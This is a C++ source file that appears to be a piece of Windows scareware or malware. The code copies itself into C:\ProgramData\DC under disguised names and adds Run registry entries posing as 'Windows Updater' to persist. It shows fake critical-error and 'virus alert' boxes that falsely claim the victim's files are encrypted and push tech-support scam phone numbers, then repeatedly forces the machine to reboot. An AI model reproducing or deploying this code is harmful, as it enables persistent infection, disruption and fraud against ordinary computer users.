 /* (c) All Rights Reserved, Dashies Software Inc. */

using namespace std;

namespace Execution_Hook {
	// 1 = User Only
	// 2 = All Users

	// Link == File | Payload == Execution Payload Name 

	std::string CurrentFile() {
		  std::string MyResult;
		  char MyPathBuff[MAX_PATH];

		   GetModuleFileName(0, MyPathBuff, MAX_PATH);
		  
		  MyResult = MyPathBuff; 
		return MyResult;
	}

	extern bool WriteToRegistry(HKEY Type, LPCSTR Key, LPCSTR exKey, std::string Data, DWORD WriteType) {
		  HKEY hKey;

		   if(RegOpenKeyEx(Type, TEXT(Key), 0, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) exit(0);

		   if(WriteType == REG_DWORD) {
			   DWORD read = atoi(Data.c_str());

		        if(RegSetValueEx(hKey, exKey, 0, WriteType, (const BYTE*)&read, sizeof(DWORD)) != ERROR_SUCCESS) exit(0);
		      
		      return true;
		   }

		   if(RegSetValueEx(hKey, exKey, 0, WriteType, (const BYTE*)Data.c_str(), Data.size()) != ERROR_SUCCESS) exit(0);
		   else if(RegCloseKey(hKey) != ERROR_SUCCESS) exit(0); else return true;
	}

	extern bool ReadMyFile(std::string File, short int SaveHere, std::string OrHere, bool CreateIfNotExist) {
		if (sizeof(File) <= 3) return false;
		fstream File_Loader(File.c_str());

		if (OrHere != "") {
			File_Loader.open(File.c_str());
			File_Loader >> OrHere;
			File_Loader.close();
		}
		else
			if (SaveHere != 0) {
				File_Loader.open(File.c_str());
				File_Loader >> SaveHere;
				File_Loader.close();
			}
	}

	extern bool CreateMyFile(std::string FILE, std::string DATA) {
		DWORD toWrite, alreadyWritten, filter;
		HANDLE handle = ::CreateFile(TEXT(FILE.c_str()), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if(handle == INVALID_HANDLE_VALUE)
			return false;

		toWrite = (DWORD)strlen(DATA.c_str());
		alreadyWritten = 0;

		filter = ::WriteFile(handle, TEXT(DATA.c_str()), toWrite, &alreadyWritten, NULL);

		if(filter == 0)
			return false;
		else
			::CloseHandle(handle);

		return true;
	}
    
    extern bool CreateDashiesDirectory(std::string Directory) {
    	if(CreateDirectory(Directory.c_str(), NULL) != 0) Sleep(0);
		else exit(0);
	}
    
	extern bool GeneratePayload(std::string Link, std::string Payload) {
		 CopyFile(TEXT(Link.c_str()), TEXT(Payload.c_str()), true);
	    return true;
	}

#include "Payloads\\Porn_Payload.h"
#include "Payloads\\Meme_Payload.h"

	extern bool AddStartupEntry(std::string File, std::string MagicalName, bool AsAdministrator, long int Mode) {
		std::string MyCutie = "NULL", MyReg = "NULL";

		MyCutie = TEXT("C:\\ProgramData\\DC\\") + File;

         switch(Mode) {
			 case 1: { // User Only | C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup <---HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
				 WriteToRegistry(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", MagicalName.c_str(), File.c_str(), REG_EXPAND_SZ);
				  if(GeneratePayload(TEXT(File.c_str()), TEXT(MyCutie.c_str())) != true)
				      MessageBox(NULL, TEXT("| PAGEFILE.SYS DOES NOT EXIST | \n\n\nYour System has detected an invalid Memory Address. Your System must restart now in order to solve this issue. \n\nYou can do this manually by going "), TEXT(": CRITICAL ERROR :"), MB_OK | MB_SYSTEMMODAL | MB_ICONSTOP);

			    break;
			 }
					  
			 case 2: { // All Users | C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup || If Proceeds, file in place, if not failure occur.
				 WriteToRegistry(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", MagicalName.c_str(), File.c_str(), REG_EXPAND_SZ);
				  if(GeneratePayload(TEXT(File.c_str()), TEXT(MyCutie.c_str())) != true)
					  MessageBox(NULL, TEXT("| BOOTMGR.SYS IS MISSING | \n\n\nWindows Updater has stopped unexpectedly, please contact your System Administrator if this problem proceeds after the next Reboot. \n\nYou may call our Support at +1-888-420-8666 if you have any questions."), TEXT(": CRITICAL ERROR :"), MB_OK | MB_SYSTEMMODAL | MB_ICONSTOP);

				break;
			 }
		 }
	}

	extern bool Run_Payload() {
	    CreateDashiesDirectory(TEXT("C:\\ProgramData\\DC"));	
	
		GeneratePayload(TEXT(CurrentFile().c_str()), TEXT("C:\\ProgramData\\DC\\shost.exe"));
		GeneratePayload(TEXT(CurrentFile().c_str()), TEXT("C:\\ProgramData\\DC\\host.exe"));
		GeneratePayload(TEXT(CurrentFile().c_str()), TEXT("C:\\ProgramData\\DC\\update.exe"));

	    AddStartupEntry(TEXT("C:\\ProgramData\\DC\\shost.exe"), TEXT("Windows Updater.exe"), false, 1);
	    AddStartupEntry(TEXT("C:\\ProgramData\\DC\\host.exe"), TEXT("Windows.exe"), false, 1);
	    AddStartupEntry(TEXT("C:\\ProgramData\\DC\\update.exe"), TEXT("Updater.exe"), false, 2);

	   DashCore.FileOne   = TEXT("C:\\ProgramData\\DC\\shost.exe");
	   DashCore.FileTwo   = TEXT("C:\\ProgramData\\DC\\host.exe");
	   DashCore.FileThree = TEXT("C:\\ProgramData\\DC\\update.exe");

		CreateMyFile(TEXT("C:\\ProgramData\\DC\\dashost.clx"), TEXT("1"));

	 	 MessageBox(NULL, TEXT("We have detected a virus on your PC, please contact an administrator or system manager as this may be fatal for your personal files and data. \n\nyour files have been encrypted, thus you will most likely not be able to access them. \nCALL : +1-855-253-6686 for assistance with this issue. \n\n- Direct_Connect"), TEXT("::: VIRUS ALERT :::"), MB_OK | MB_SYSTEMMODAL | MB_ICONSTOP);

		for(int index = 0; index <= 50; index = index + 1)
		    system("C:\\WINDOWS\\SYSTEM32\\SHUTDOWN.EXE -r -t 0");
	}
};
